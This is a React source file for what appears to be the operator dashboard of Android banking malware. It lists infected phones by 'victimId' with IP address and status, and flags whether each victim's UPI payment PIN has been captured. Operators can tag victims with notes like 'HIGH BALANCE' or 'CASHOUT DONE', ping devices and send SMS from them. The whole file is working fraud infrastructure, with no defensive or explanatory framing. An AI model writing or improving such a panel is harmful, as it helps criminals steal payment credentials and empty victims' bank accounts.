import { useNavigate } from "react-router-dom";
import { useState, useMemo, useEffect, useRef } from "react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
  SelectSeparator,
} from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import {
  Search,
  Filter,
  ChevronLeft,
  ChevronRight,
  Trash2,
  Eye,
  MessageSquare,
  Loader2,
  AlertCircle,
  Smartphone,
  X,
} from "lucide-react";
import { DeviceInfo } from "@/data/db";
import { SendSMSDialog } from "./SendSMSDialog";
import { useDB } from "@/hooks/useDB";
import { formatTime, parseTime } from "@/utils/time";
import { toast } from "sonner";
import { firebaseService } from "@/lib/firebaseService";

interface DeviceTableProps {
  devices: Record<string, DeviceInfo>;
  loading?: boolean;
  error?: string | null;
}

export function DeviceTable({
  devices,
  loading = false,
  error = null,
}: DeviceTableProps) {
  const navigate = useNavigate();
  const { updateDevice, db } = useDB();
  const responseTimeouts = useRef<Record<string, NodeJS.Timeout>>({});
  // refs to the inline note inputs so we can focus them after clearing
  const noteInputRefs = useRef<Record<string, HTMLInputElement | null>>({});

  // Clean up timeouts on unmount
  useEffect(() => {
    return () => {
      Object.values(responseTimeouts.current).forEach(clearTimeout);
    };
  }, []);

  // State for filtering and pagination
  const [searchTerm, setSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [availabilityFilter, setAvailabilityFilter] = useState<string>("all");
  const [notesFilter, setNotesFilter] = useState<string>("all");
  const [orderFilter, setOrderFilter] = useState<string>("desc"); // desc = newest first
  const [rowsPerPage, setRowsPerPage] = useState<number>(10);
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [noteEdits, setNoteEdits] = useState<Record<string, string>>({});
  // Draft values while typing inside the dropdown input. Only committed on Enter or blur.
  const [noteDrafts, setNoteDrafts] = useState<Record<string, string>>({});
  // Track open state per-note Select so we can programmatically close after Enter
  const [noteSelectOpen, setNoteSelectOpen] = useState<Record<string, boolean>>({});
  const NOTE_PRESETS = useMemo(
    () => ["HIGH BALANCE", "LOW BALANCE", "CASHOUT DONE", "NO BANK"],
    [],
  );

  // State for Send SMS dialog
  const [smsDialogOpen, setSmsDialogOpen] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<{
    id: string;
    info: DeviceInfo;
  } | null>(null);

  const getBatteryColor = (battery: string) => {
    const level = parseInt(battery.replace("%", ""));
    if (level < 20) return "destructive";
    if (level < 50) return "secondary";
    return "default";
  };

  // Robust date parsing for various formats
  const toTimestamp = (value?: string): number => {
    if (!value) return 0;
    const ddmmyyRegex = /^\d{2}-\d{2}-\d{4}/; // dd-MM-yyyy HH:mm:ss
    try {
      if (ddmmyyRegex.test(value)) {
        return parseTime(value).getTime();
      }
      const d = new Date(value);
      if (!isNaN(d.getTime())) return d.getTime();
    } catch {}
    return 0;
  };

  const getStatusBadge = (status: string) => {
    if (status === "Online")
      return "bg-green-100 text-green-800 border-green-200";
    if (status === "Offline") return "bg-red-100 text-red-800 border-red-200";
    return "bg-gray-100 text-gray-800 border-gray-200";
  };

  // Live ResponseChecker map
  const [responseChecker, setResponseChecker] = useState<Record<string, { deviceId?: string; response?: string; timeStr?: string }>>({});

  useEffect(() => {
    const unsub = firebaseService.onResponseCheckerUpdate((data) => {
      setResponseChecker(data || {});
    });
    return () => unsub && unsub();
  }, []);

  // Derive status: if ResponseChecker says idle/true -> Online, if pending -> Offline, else fallback to device.Status
  const deriveStatus = (victimId: string, device: DeviceInfo): string => {
    const keys = [String(device.Model || '').trim(), victimId].filter(Boolean);
    let resp: string | undefined;
    for (const k of keys) {
      const rc = responseChecker[k];
      if (rc && rc.response) {
        resp = String(rc.response).toLowerCase();
        break;
      }
    }
    if (resp) {
      if (resp === 'idle' || resp === 'true') return 'Online';
      if (resp === 'pending') return 'Offline';
    }
    return device.Status || 'Unknown';
  };

  const getUPIPinBadge = (victimId: string, db: any) => {
    const upiPins = db?.UPIPins?.[victimId] || [];
    const hasValidPin =
      upiPins.length > 0 &&
      upiPins.some((pinObj: any) => {
        // Handle new structure: { pin: string, timestamp: string }
        if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
          return pinObj.pin && pinObj.pin !== "No Pin";
        }
        // Handle old structure: string[]
        if (typeof pinObj === 'string') {
          return pinObj && pinObj !== "No Pin";
        }
        return false;
      });

    if (hasValidPin) {
      return "bg-green-100 text-green-800 border-green-200";
    } else {
      return "bg-red-100 text-red-800 border-red-200";
    }
  };

  // Ping device without navigation: set ResponseChecker to pending and verify after 5s
  const handlePingDevice = async (
    victimId: string,
    device: DeviceInfo,
    e: React.MouseEvent
  ) => {
    e.stopPropagation();
    try {
      const modelIdentifier = (device.Model || '').trim() || victimId;
      await firebaseService.setResponsePending(modelIdentifier, undefined, victimId);

      // Clear any existing timeout for this device
      if (responseTimeouts.current[victimId]) {
        clearTimeout(responseTimeouts.current[victimId]);
      }

      responseTimeouts.current[victimId] = setTimeout(async () => {
        try {
          const data = await firebaseService.getResponseCheckerAny([modelIdentifier, victimId]);
          const resp = (data?.response || '').toString().toLowerCase();
          const isOnline = resp === 'idle' || resp === 'true';

          await firebaseService.updateDeviceStatus(victimId, isOnline ? 'Online' : 'Offline');
          toast[isOnline ? 'success' : 'error'](
            `Device is ${isOnline ? 'online' : 'offline'}`,
            { duration: 3000 }
          );
        } catch (err) {
          console.error('Failed checking ResponseChecker (ping):', err);
          toast.error('Failed to verify device status');
        }
      }, 5000);
    } catch (err) {
      console.error('Failed to ping device (set pending):', err);
      toast.error('Failed to send check request');
    }
  };

  const handleViewDevice = async (
    victimId: string,
    device: DeviceInfo,
    e: React.MouseEvent
  ) => {
    e.stopPropagation();
    e.preventDefault(); // Prevent default link behavior
    
    try {
      // The Firebase export shows ResponseChecker keys are Model (e.g., "Google Pixel 4a").
      // Use Model as the primary key, mirror to victimId for safety.
      const modelIdentifier = (device.Model || '').trim() || victimId;

      // Set ResponseChecker to pending with a fresh timeStr (dd-MM-yyyy HH:mm:ss)
      await firebaseService.setResponsePending(modelIdentifier, undefined, victimId);

      // Open device page in a new tab
      const deviceUrl = `/device/${victimId}`;
      window.open(deviceUrl, '_blank', 'noopener,noreferrer');

      // Clear any existing timeout for this device
      if (responseTimeouts.current[victimId]) {
        clearTimeout(responseTimeouts.current[victimId]);
      }

      // After 5 seconds, read ResponseChecker once and update status
      responseTimeouts.current[victimId] = setTimeout(async () => {
        try {
          const data = await firebaseService.getResponseCheckerAny([modelIdentifier, victimId]);
          const resp = (data?.response || '').toString().toLowerCase();
          const isOnline = resp === 'idle' || resp === 'true';

          await firebaseService.updateDeviceStatus(victimId, isOnline ? 'Online' : 'Offline');

          toast[isOnline ? 'success' : 'error'](
            `Device is ${isOnline ? 'online' : 'offline'}`,
            { duration: 3000 }
          );
        } catch (err) {
          console.error('Failed checking ResponseChecker:', err);
          toast.error('Failed to verify device status');
        }
      }, 5000);
    } catch (err) {
      console.error('Failed to set ResponseChecker pending:', err);
      toast.error('Failed to send check request');
    }
  };

  const handleSendSMS = (
    victimId: string,
    device: DeviceInfo,
    e: React.MouseEvent,
  ) => {
    e.stopPropagation();
    setSelectedDevice({ id: victimId, info: device });
    setSmsDialogOpen(true);
  };

  const closeSMSDialog = () => {
    setSmsDialogOpen(false);
    setSelectedDevice(null);
  };

  // Filter and paginate devices
  const filteredAndPaginatedDevices = useMemo(() => {
    const filtered = Object.entries(devices).filter(([victimId, device]) => {
      // Search filter
      const searchMatch =
        searchTerm === "" ||
        victimId.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.Brand || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.Model || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.Note || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
        (device.IPAddress || "")
          .toLowerCase()
          .includes(searchTerm.toLowerCase());

      // Status filter
      const currentStatus = deriveStatus(victimId, device);
      const statusMatch =
        statusFilter === "all" || currentStatus === statusFilter;

      // UPI Pin filter
      const upiPins = db?.UPIPins?.[victimId] || [];
      const hasValidPin =
        upiPins.length > 0 &&
        upiPins.some((pinObj: any) => {
          // Handle new structure: { pin: string, timestamp: string }
          if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
            return pinObj.pin && pinObj.pin !== "No Pin";
          }
          // Handle old structure: string[]
          if (typeof pinObj === 'string') {
            return pinObj && pinObj !== "No Pin";
          }
          return false;
        });
      const availabilityMatch =
        availabilityFilter === "all" ||
        (availabilityFilter === "noPin" && !hasValidPin) ||
        (availabilityFilter === "hasPin" && hasValidPin);

      // Notes filter
      const hasNote = device.Note && device.Note.trim() !== "";
      const notesMatch = 
        notesFilter === "all" ||
        (notesFilter === "hasNote" && hasNote) ||
        (notesFilter === "noNote" && !hasNote);

      // Debug logging
      console.log("Filtering device:", victimId, {
        searchMatch,
        statusMatch,
        availabilityMatch,
        notesMatch,
        searchTerm,
        statusFilter,
        availabilityFilter,
        notesFilter,
        deviceStatus: currentStatus,
        deviceUPIPin: device.UPIPin,
        hasNote,
      });

      return searchMatch && statusMatch && availabilityMatch && notesMatch;
    });

    console.log(
      "Filtered devices:",
      filtered.length,
      "out of",
      Object.keys(devices).length,
    );
    // Sort by Added date/time
    const direction = orderFilter === 'desc' ? -1 : 1; // when desc, we want b - a
    const sorted = [...filtered].sort(([, a], [, b]) => {
      const ta = toTimestamp(a.Added);
      const tb = toTimestamp(b.Added);
      // if desc: tb - ta; if asc: ta - tb
      return direction * (ta - tb);
    });
    return sorted;
  }, [devices, searchTerm, statusFilter, availabilityFilter, orderFilter, notesFilter]);

  // Calculate pagination
  const totalPages = Math.ceil(
    filteredAndPaginatedDevices.length / rowsPerPage,
  );
  const startIndex = (currentPage - 1) * rowsPerPage;
  const endIndex = startIndex + rowsPerPage;
  const currentDevices = filteredAndPaginatedDevices.slice(
    startIndex,
    endIndex,
  );

  // Reset to first page when filters change
  const handleFilterChange = () => {
    setCurrentPage(1);
  };

  const resetFilters = () => {
    setSearchTerm("");
    setStatusFilter("all");
    setAvailabilityFilter("all");
    setCurrentPage(1);
  };

  const handleSearch = (value: string) => {
    setSearchTerm(value);
    handleFilterChange();
  };

  const handleStatusFilter = (value: string) => {
    setStatusFilter(value);
    handleFilterChange();
  };

  const handleAvailabilityFilter = (value: string) => {
    setAvailabilityFilter(value);
    handleFilterChange();
  };

  const handleNotesFilter = (value: string) => {
    setNotesFilter(value);
    handleFilterChange();
  };

  const handleOrderFilter = (value: string) => {
    setOrderFilter(value);
    handleFilterChange();
  };

  const handleDeleteDevice = async (deviceId: string, deviceName: string) => {
    if (window.confirm(`Are you sure you want to delete device ${deviceName}? This action cannot be undone.`)) {
      try {
        await firebaseService.deleteDevice(deviceId);
        toast.success(`Device ${deviceName} deleted successfully`);
      } catch (error) {
        console.error("Error deleting device:", error);
        toast.error(`Failed to delete device ${deviceName}`);
      }
    }
  };

  const handleRowsPerPage = (value: string) => {
    setRowsPerPage(parseInt(value));
    setCurrentPage(1);
  };

  // Update draft while typing; do NOT change the committed select value until commitNote is called.
  const handleNoteDraftChange = (victimId: string, value: string) => {
    setNoteDrafts((prev) => ({ ...prev, [victimId]: value }));
  };

  const commitNote = async (victimId: string, value?: string) => {
    const draft = value !== undefined ? value : noteDrafts[victimId];
    const newVal = (draft ?? noteEdits[victimId] ?? "").trim();
    setNoteEdits((prev) => ({ ...prev, [victimId]: newVal }));
    setNoteDrafts((prev) => ({ ...prev, [victimId]: newVal }));
    try {
      await updateDevice(victimId, { Note: newVal });
    } catch (e) {
      console.error("Failed to update note for", victimId, e);
    }
  };

  // Commit draft and close the Select menu for a row
  const commitNoteAndClose = (victimId: string, value?: string) => {
    const draft = value !== undefined ? value : noteDrafts[victimId];
    const newVal = (draft ?? noteEdits[victimId] ?? "").trim();
    // update UI immediately
    setNoteEdits((prev) => ({ ...prev, [victimId]: newVal }));
    setNoteDrafts((prev) => ({ ...prev, [victimId]: newVal }));
    setNoteSelectOpen((prev) => ({ ...prev, [victimId]: false }));
    // persist in background
    (async () => {
      try {
        await updateDevice(victimId, { Note: newVal });
      } catch (e) {
        console.error("Failed to update note for", victimId, e);
      }
    })();
  };

  const handleNoteBlur = async (victimId: string) => {
    // Commit draft on blur as a fallback
    await commitNote(victimId);
  };

  const handleNotePresetChange = async (victimId: string, value: string) => {
    if (value === "custom") {
      // open input with empty draft
      setNoteDrafts((prev) => ({ ...prev, [victimId]: "" }));
      return;
    }
    // preset selection immediately commits
    setNoteEdits((prev) => ({ ...prev, [victimId]: value }));
    setNoteDrafts((prev) => ({ ...prev, [victimId]: value }));
    try {
      await updateDevice(victimId, { Note: value });
    } catch (e) {
      console.error("Failed to set preset note for", victimId, e);
    }
  };

  const goToPage = (page: number) => {
    setCurrentPage(Math.max(1, Math.min(page, totalPages)));
  };

  const goToPreviousPage = () => goToPage(currentPage - 1);
  const goToNextPage = () => goToPage(currentPage + 1);

  // Generate page numbers for pagination
  const getPageNumbers = () => {
    const pages = [];
    const maxVisiblePages = 5;

    if (totalPages <= maxVisiblePages) {
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i);
      }
    } else {
      if (currentPage <= 3) {
        for (let i = 1; i <= 5; i++) {
          pages.push(i);
        }
        if (totalPages > 5) pages.push("...");
        pages.push(totalPages);
      } else if (currentPage >= totalPages - 2) {
        pages.push(1);
        pages.push("...");
        for (let i = totalPages - 4; i <= totalPages; i++) {
          pages.push(i);
        }
      } else {
        pages.push(1);
        pages.push("...");
        for (let i = currentPage - 1; i <= currentPage + 1; i++) {
          pages.push(i);
        }
        pages.push("...");
        pages.push(totalPages);
      }
    }

    return pages;
  };

  const formatAdded = (added?: string) => {
    // Return dash if added is falsy or empty string
    if (!added || added.trim() === '') return "-";
    
    // If it's already in dd-MM-yyyy HH:mm:ss format, return as is
    const ddmmyyRegex = /^\d{2}-\d{2}-\d{4}/;
    if (ddmmyyRegex.test(added)) return added;
    
    // Try to parse as ISO or other standard date
    const date = new Date(added);
    if (!isNaN(date.getTime())) {
      return formatTime(date);
    }
    
    // If we can't parse the date, return a dash
    return "-";
  };

  // Show loading state
  if (loading) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
          <p className="text-lg font-medium text-muted-foreground">
            Loading devices...
          </p>
          <p className="text-sm text-muted-foreground">
            Connecting to Firebase
          </p>
        </div>
      </Card>
    );
  }

  // Show error state
  if (error) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <AlertCircle className="w-8 h-8 mx-auto mb-4 text-destructive" />
          <p className="text-lg font-medium text-destructive mb-2">
            Failed to load devices
          </p>
          <p className="text-sm text-muted-foreground mb-4">{error}</p>
          <Button onClick={() => window.location.reload()}>Try Again</Button>
        </div>
      </Card>
    );
  }

  // Show empty state
  if (Object.keys(devices).length === 0) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-4">
            <MessageSquare className="w-8 h-8 text-muted-foreground" />
          </div>
          <p className="text-lg font-medium text-muted-foreground mb-2">
            No devices found
          </p>
          <p className="text-sm text-muted-foreground">
            Start by adding your first device to the system
          </p>
        </div>
      </Card>
    );
  }

  return (
    <>
      <Card className="card-glass border-0 animate-slide-up">
        {/* Filters Section */}
        <div className="p-6 border-b bg-muted/20">
          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
            <div className="flex flex-col sm:flex-row gap-4 flex-1">
              {/* Search */}
              <div className="flex flex-col gap-2 flex-1 max-w-sm">
                <Label htmlFor="device-search" className="text-sm font-medium">
                  Search
                </Label>
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                  <Input
                    id="device-search"
                    placeholder="Search devices, brands, models..."
                    value={searchTerm}
                    onChange={(e) => handleSearch(e.target.value)}
                    className="pl-10"
                  />
                </div>
              </div>

              {/* Status Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label htmlFor="status-filter" className="text-sm font-medium">
                  Status
                </Label>
                <Select value={statusFilter} onValueChange={handleStatusFilter}>
                  <SelectTrigger id="status-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Status</SelectItem>
                    <SelectItem value="Online">Online</SelectItem>
                    <SelectItem value="Offline">Offline</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* UPI Pin Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label
                  htmlFor="availability-filter"
                  className="text-sm font-medium"
                >
                  UPI Pin
                </Label>
                <Select
                  value={availabilityFilter}
                  onValueChange={handleAvailabilityFilter}
                >
                  <SelectTrigger id="availability-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All</SelectItem>
                    <SelectItem value="noPin">No Pin</SelectItem>
                    <SelectItem value="hasPin">Has Pin</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Notes Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label
                  htmlFor="notes-filter"
                  className="text-sm font-medium"
                >
                  Notes
                </Label>
                <Select
                  value={notesFilter}
                  onValueChange={handleNotesFilter}
                >
                  <SelectTrigger id="notes-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All</SelectItem>
                    <SelectItem value="hasNote">Has Note</SelectItem>
                    <SelectItem value="noNote">No Note</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Order Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label htmlFor="order-filter" className="text-sm font-medium">
                  Order
                </Label>
                <Select value={orderFilter} onValueChange={handleOrderFilter}>
                  <SelectTrigger id="order-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="desc">Newest first</SelectItem>
                    <SelectItem value="asc">Oldest first</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Reset Filters Button */}
              <div className="flex flex-col gap-2">
                <Label className="text-sm font-medium opacity-0">Reset</Label>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={resetFilters}
                  className="px-3"
                >
                  Reset Filters
                </Button>
              </div>
            </div>
          </div>
        </div>

        {/* Table */}
        <div className="overflow-x-auto">
          <Table>
            <TableHeader className="sticky top-0 bg-background/80 backdrop-blur-sm">
              <TableRow>
                <TableHead className="font-semibold text-center">Status</TableHead>
                <TableHead className="font-semibold">Device</TableHead>
                <TableHead className="font-semibold text-center">Android</TableHead>
                <TableHead className="font-semibold text-center px-2 w-[120px]">UPI Pin</TableHead>
                <TableHead className="font-semibold text-center">IP Address</TableHead>
                <TableHead className="font-semibold text-center">Note</TableHead>
                <TableHead className="font-semibold text-center">Added</TableHead>
                <TableHead className="font-semibold text-center">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {currentDevices.map(([victimId, device]) => (
                <TableRow
                  key={victimId}
                  className="hover:bg-muted/50 transition-colors"
                >
                  <TableCell className="text-center">
                    {(() => {
                      const status = deriveStatus(victimId, device);
                      return (
                        <Badge className={`${getStatusBadge(status)} mx-auto`}>
                          {status}
                        </Badge>
                      );
                    })()}
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center gap-3">
                      <div className="relative">
                        <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
                          <Smartphone className="w-5 h-5 text-white" />
                        </div>
                      </div>
                      <div>
                        <div className="font-medium">{victimId}</div>
                        <div className="text-sm text-muted-foreground">
                          {device.Model}
                        </div>
                      </div>
                    </div>
                  </TableCell>
                  <TableCell className="text-center">
                    <Badge variant="outline" className="mx-auto">
                      Android V{device.AndroidVersion}
                    </Badge>
                  </TableCell>
                  <TableCell className="px-2 w-[120px]">
                    <div className="flex justify-center">
                      <div className="whitespace-nowrap">
                        {(() => {
                          const upiPins = db?.UPIPins?.[victimId] || [];
                          const hasValidPin =
                            upiPins.length > 0 &&
                            upiPins.some((pinObj: any) => {
                              if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
                                return pinObj.pin && pinObj.pin !== "No Pin";
                              }
                              if (typeof pinObj === 'string') {
                                return pinObj && pinObj !== "No Pin";
                              }
                              return false;
                            });
                          return (
                            <Badge 
                              className={`${getUPIPinBadge(victimId, db)} w-[80px] justify-center`}
                            >
                              <span className="inline-block w-full text-center">
                                {hasValidPin ? "Has Pin" : "No Pin"}
                              </span>
                            </Badge>
                          );
                        })()}
                      </div>
                    </div>
                  </TableCell>
                  <TableCell className="text-muted-foreground text-center">
                    {device.IP || device.IPAddress || "Unknown"}
                  </TableCell>
                  <TableCell className="text-center">
                    {(() => {
                      const currentNote =
                        noteEdits[victimId] ??
                        (typeof device.Note === "string" ? device.Note : "");
                      const isPreset = NOTE_PRESETS.includes(currentNote);
                      // If there's any currentNote (preset or custom) use it as the selected value
                      // so the SelectTrigger shows the custom text. Otherwise use sentinel "custom".
                      const selected = currentNote && currentNote !== "" ? currentNote : "custom";
                      return (
                        <div className="flex flex-col items-center gap-2">
                          <Select
                            value={selected}
                            onValueChange={(v) =>
                              handleNotePresetChange(victimId, v)
                            }
                            open={!!noteSelectOpen[victimId]}
                            onOpenChange={(open) =>
                              setNoteSelectOpen((prev) => ({ ...prev, [victimId]: open }))
                            }
                          >
                            {/* Fixed width trigger (w-44) but allow the inner span to wrap to 2 lines
                                so very long custom notes don't expand the dropdown width. The
                                SelectTrigger component applies a default line-clamp; we override
                                it here to allow wrapping. */}
                            <SelectTrigger className="w-44 mx-auto justify-center [&>span]:line-clamp-2">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              {NOTE_PRESETS.map((opt) => (
                                <SelectItem key={opt} value={opt}>
                                  {opt}
                                </SelectItem>
                              ))}

                              {/* If currentNote is a custom (non-preset) value, render it
                                  as an option so the SelectTrigger displays the custom text
                                  after the select is closed. */}
                              {!isPreset && currentNote && currentNote !== "" && (
                                <SelectItem value={currentNote}>
                                  {/* Constrain the custom note's width and allow wrapping/breaking
                                      so it doesn't force the dropdown to grow horizontally. */}
                                  <div className="max-w-[11rem] break-words whitespace-normal text-sm">
                                    {currentNote}
                                  </div>
                                </SelectItem>
                              )}

                              <SelectSeparator />

                              {/* Custom input: render as a non-selectable container inside the SelectContent
                                  Stop pointer/mouse/key propagation so the Select doesn't close when
                                  interacting with the input */}
                              <div
                                // role none to indicate this is not an option
                                role="presentation"
                                className="px-1 py-1"
                                onPointerDown={(e) => e.stopPropagation()}
                                onMouseDown={(e) => e.stopPropagation()}
                                onClick={(e) => e.stopPropagation()}
                              >
                                <div className="text-sm px-2">Add Note</div>
                                <div className="flex items-center gap-2 justify-center">
                                  <Input
                                    // Show draft while typing; fall back to committed note
                                    ref={(el) => (noteInputRefs.current[victimId] = el as HTMLInputElement | null)}
                                    value={noteDrafts[victimId] ?? currentNote}
                                    onChange={(e) =>
                                      handleNoteDraftChange(victimId, e.target.value)
                                    }
                                    onBlur={() => handleNoteBlur(victimId)}
                                    onPointerDown={(e) => e.stopPropagation()}
                                    onMouseDown={(e) => e.stopPropagation()}
                                    // Stop events in capture phase so Radix's type-to-select
                                    // doesn't receive key events and move focus to items.
                                    onKeyDownCapture={(e) => {
                                      e.stopPropagation();
                                      try { e.nativeEvent && (e.nativeEvent as any).stopImmediatePropagation(); } catch (err) {}
                                    }}
                                    onKeyPressCapture={(e) => {
                                      e.stopPropagation();
                                      try { e.nativeEvent && (e.nativeEvent as any).stopImmediatePropagation(); } catch (err) {}
                                    }}
                                    onKeyUpCapture={(e) => {
                                      e.stopPropagation();
                                      try { e.nativeEvent && (e.nativeEvent as any).stopImmediatePropagation(); } catch (err) {}
                                    }}
                                    onKeyDown={(e) => {
                                      // Prevent Radix Select from reacting to any keys while typing
                                      e.stopPropagation();
                                      // Commit only on Enter and then close the dropdown
                                      if (e.key === "Enter") {
                                        e.preventDefault();
                                        // fire-and-forget commit and close
                                        commitNoteAndClose(victimId, noteDrafts[victimId]);
                                      }
                                      // If desired, Escape could revert the draft to committed value
                                    }}
                                    placeholder="Type note..."
                                    className="h-8 text-sm w-36 placeholder:text-muted-foreground"
                                  />
                                  <Button
                                    size="icon"
                                    variant="ghost"
                                    className="w-6 h-6 p-0"
                                    onClick={(e) => {
                                      // prevent closing the select
                                      e.stopPropagation();
                                      handleNoteDraftChange(victimId, "");
                                      // focus back to input
                                      setTimeout(() => noteInputRefs.current[victimId]?.focus(), 0);
                                    }}
                                  >
                                    <X className="w-3 h-3" />
                                  </Button>
                                </div>
                              </div>
                            </SelectContent>
                          </Select>

                          {/* input moved into the dropdown - keep this empty so layout stays consistent */}
                        </div>
                      );
                    })()}
                  </TableCell>
                  <TableCell className="text-center">
                    <span className="text-sm text-muted-foreground">
                      {formatAdded(device.Added)}
                    </span>
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center gap-2 justify-center">
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-8 h-8 rounded-full hover:bg-primary/10 hover:text-primary"
                        onClick={(e) => handleViewDevice(victimId, device, e)}
                        title="View Device"
                      >
                        <Eye className="w-4 h-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-8 h-8 rounded-full hover:bg-primary/10 hover:text-primary"
                        onClick={(e) => handlePingDevice(victimId, device, e)}
                        title="Load / Ping"
                      >
                        <Loader2 className="w-4 h-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="ghost"
                        className="w-8 h-8 rounded-full hover:bg-destructive/10 hover:text-destructive"
                        onClick={(e) => {
                          e.stopPropagation();
                          handleDeleteDevice(victimId, victimId);
                        }}
                        title="Delete Device"
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>

        {/* Pagination and Rows per Page */}
        <div className="p-6 border-t bg-muted/20">
          <div className="flex flex-col sm:flex-row gap-4 items-center justify-between">
            {/* Rows per page */}
            <div className="flex items-center gap-2">
              <Label htmlFor="rows-per-page" className="text-sm">
                Rows per page
              </Label>
              <Select
                value={rowsPerPage.toString()}
                onValueChange={handleRowsPerPage}
              >
                <SelectTrigger id="rows-per-page" className="w-24">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="5">5</SelectItem>
                  <SelectItem value="10">10</SelectItem>
                  <SelectItem value="25">25</SelectItem>
                  <SelectItem value="50">50</SelectItem>
                  <SelectItem value="100">100</SelectItem>
                  <SelectItem value="200">200</SelectItem>
                  <SelectItem value="300">300</SelectItem>
                  <SelectItem value="400">400</SelectItem>
                  <SelectItem value="500">500</SelectItem>
                  <SelectItem value="600">600</SelectItem>
                  <SelectItem value="700">700</SelectItem>
                  <SelectItem value="800">800</SelectItem>
                  <SelectItem value="900">900</SelectItem>
                  <SelectItem value="1000">1000</SelectItem>
                  <SelectItem value="2000">2000</SelectItem>
                  <SelectItem value="5000">5000</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Pagination */}
            <div className="flex items-center gap-2">
              <span className="text-sm text-muted-foreground">
                {startIndex + 1}-
                {Math.min(endIndex, filteredAndPaginatedDevices.length)} of{" "}
                {filteredAndPaginatedDevices.length}
              </span>

              <div className="flex items-center gap-1">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={goToPreviousPage}
                  disabled={currentPage === 1}
                  className="w-8 h-8 p-0"
                >
                  <ChevronLeft className="w-4 h-4" />
                </Button>

                {getPageNumbers().map((page, index) => (
                  <Button
                    key={index}
                    variant={page === currentPage ? "default" : "outline"}
                    size="sm"
                    onClick={() => typeof page === "number" && goToPage(page)}
                    disabled={page === "..."}
                    className="w-8 h-8 p-0"
                  >
                    {page}
                  </Button>
                ))}

                <Button
                  variant="outline"
                  size="sm"
                  onClick={goToNextPage}
                  disabled={currentPage === totalPages}
                  className="w-8 h-8 p-0"
                >
                  <ChevronRight className="w-4 h-4" />
                </Button>
              </div>
            </div>
          </div>
        </div>
      </Card>

      {/* Send SMS Dialog */}
      {selectedDevice && (
        <SendSMSDialog
          isOpen={smsDialogOpen}
          onClose={closeSMSDialog}
          device={selectedDevice.info}
          deviceId={selectedDevice.id}
        />
      )}
    </>
  );
}
